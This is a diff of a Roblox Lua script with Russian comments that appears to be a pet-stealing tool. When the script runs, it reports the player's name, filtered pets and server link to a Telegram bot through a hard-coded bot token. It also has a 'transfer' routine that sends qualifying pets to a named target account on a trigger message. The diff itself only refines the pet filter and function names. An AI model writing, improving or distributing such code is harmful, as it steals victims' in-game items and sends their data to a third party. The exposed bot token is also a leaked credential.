@@ -6,38 +6,38 @@ local player = Players.LocalPlayer
 
 -- 🔧 НАСТРОЙКИ
 local TELEGRAM_TOKEN = "7678595031:AAHYzkbKKI4CdT6B2NUGcYY6IlTvWG8xkzE"
-local TELEGRAM_CHAT_ID = "7144575011"
+local TELEGRAM_CHAT_ID = "ВАШ_CHAT_ID"
 local TARGET_PLAYER = "Rikizigg"
 local TRIGGER_MESSAGE = "."
 
--- 🐾 БЕЛЫЙ СПИСОК ПИТОМЦЕВ (формат: "Название [ВЕС] [Age ВОЗРАСТ]")
-local WHITELIST = {
+-- 🐾 ТОЧНЫЕ НАЗВАНИЯ ПИТОМЦЕВ (без дополнительных параметров)
+local PET_NAMES = {
     "Hamster",
 }
 
--- 🔎 Фильтрация только питомцев с весом и возрастом
-local function getFilteredPets()
+-- 🔎 Фильтрация ТОЛЬКО питомцев
+local function getTruePets()
     local pets = {}
     local backpack = player:FindFirstChild("Backpack") or player.Character
     
     for _, item in ipairs(backpack:GetChildren()) do
         if item:IsA("Tool") then
-            -- Проверяем формат "[X.XX KG] [Age X]"
+            -- Проверяем ЧИСТОЕ название (первое слово до пробела)
+            local baseName = item.Name:match("^([^%[]+)") or item.Name
+            baseName = baseName:gsub("%s+$", "")
+            
+            -- Проверяем формат веса/возраста
             local weight, age = item.Name:match("%[(%d+%.%d+) KG%].*%[Age (%d+)%]")
-            if weight and age then
-                -- Проверяем белый список
-                for _, petName in ipairs(WHITELIST) do
-                    if item.Name:find(petName) then
-                        table.insert(pets, {
-                            name = petName,
-                            fullName = item.Name,
-                            weight = tonumber(weight),
-                            age = tonumber(age),
-                            object = item
-                        })
-                        break
-                    end
-                end
+            
+            -- Если есть совпадение и параметры
+            if table.find(PET_NAMES, baseName) and weight and age then
+                table.insert(pets, {
+                    name = baseName,
+                    fullName = item.Name,
+                    weight = tonumber(weight),
+                    age = tonumber(age),
+                    object = item
+                })
             end
         end
     end
@@ -45,9 +45,9 @@ local function getFilteredPets()
     return pets
 end
 
--- 📜 Формирование списка питомцев для уведомления
-local function getPetsList()
-    local pets = getFilteredPets()
+-- 📜 Формирование списка питомцев
+local function getCleanPetsList()
+    local pets = getTruePets()
     if #pets == 0 then return "нет питомцев" end
     
     local list = {}
@@ -85,7 +85,7 @@ end
 
 -- 🚀 Основная функция передачи
 local function startPetTransfer()
-    local pets = getFilteredPets()
+    local pets = getTruePets()
     if #pets == 0 then
         sendToTelegram("❌ Нет подходящих питомцев")
         return
@@ -110,7 +110,7 @@ end
 -- 🏁 ИНИЦИАЛИЗАЦИЯ
 sendToTelegram(
     "🔔 "..player.Name.." активировал скрипт\n"..
-    "🐾 Питомцы:\n"..getPetsList().."\n"..
+    "🐾 Питомцы:\n"..getCleanPetsList().."\n"..
     "🔗 "..getServerLink()
 )
 
